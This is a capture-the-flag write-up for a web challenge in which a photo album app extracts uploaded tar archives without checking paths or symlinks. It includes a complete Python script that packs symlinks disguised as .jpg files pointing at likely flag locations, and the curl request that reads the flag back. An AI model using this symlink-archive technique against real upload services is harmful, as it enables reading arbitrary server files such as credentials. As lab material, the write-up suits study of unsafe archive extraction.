
#  CTF Writeup: Photo Album (Web Exploitation)

**Author: marv1nh**

**solves: 14**

##  Challenge Summary

The challenge provided a basic photo album web app where users could upload either image files (`.jpg`, `.png`, etc.) or a `.tar` archive containing images. The goal was to exploit this upload feature to retrieve a flag.

---

##  Recon and Source Review

From the source code (`app.py`), a few key details were observed:

###  Functionality:
- Accepts image uploads and `.tar` archives.
- Archives are extracted using `tarfile.extractall()`.
- Filters TAR contents to **only allow files with image extensions**.

###  Vulnerabilities:
1. **TAR Extraction Without Path Sanitization**  
   The app extracts uploaded `.tar` files using `tarfile.extractall()` **without validating the paths** inside, making it vulnerable to:
   - Path traversal (`../../`)
   - **Symbolic link attacks**

2. **MIME Type Based on Extension**  
   The server only checks file extensions, so you can upload files like `shell.jpg` containing PHP code, and the extension check will pass.

3. **No Checks on Symlinks Inside TAR**  
   The validation function only checks that each file in the TAR ends in `.jpg`, `.png`, etc. It doesn't check if the entry is a **symlink** pointing to a sensitive file.

---

##  Exploitation Strategy

Since I couldn’t guess the exact flag location, I created a script that builds a `.tar` archive with **multiple symlinks** named with image extensions (`.jpg`), each pointing to common flag paths.

---

##  `photo.py` – Brute-force Symlink TAR Generator

```python
import tarfile

paths = {
    "a.jpg": "/flag.txt",
    "b.jpg": "/flag",
    "c.jpg": "/app/flag.txt",
    "d.jpg": "/app/flag",
    "e.jpg": "/home/ctf/flag.txt",
    "f.jpg": "/home/ctf/flag",
    "g.jpg": "/root/flag.txt",
    "h.jpg": "/root/flag",
    "i.jpg": "/home/appuser/flag.txt",
    "j.jpg": "/home/appuser/flag",
    "k.jpg": "/srv/flag.txt",
    "l.jpg": "/srv/flag",
}

with tarfile.open("multi_flag_brute.tar", "w") as tar:
    for name, target in paths.items():
        info = tarfile.TarInfo(name=name)
        info.type = tarfile.SYMTYPE
        info.linkname = target
        tar.addfile(info)
```

---

## Uploading the Payload

Uploaded `multi_flag_brute.tar` via the site’s file upload form.

Then checked the exposed `.jpg` symlinks one by one. First try:

```bash
curl http://photo-album.hkn/static/albums/a.jpg
```

Output:
```
DDC{f4k3_im4g3_r34l_fl4g}
```

---

## 🏁 Flag

```
DDC{f4k3_im4g3_r34l_fl4g}
```
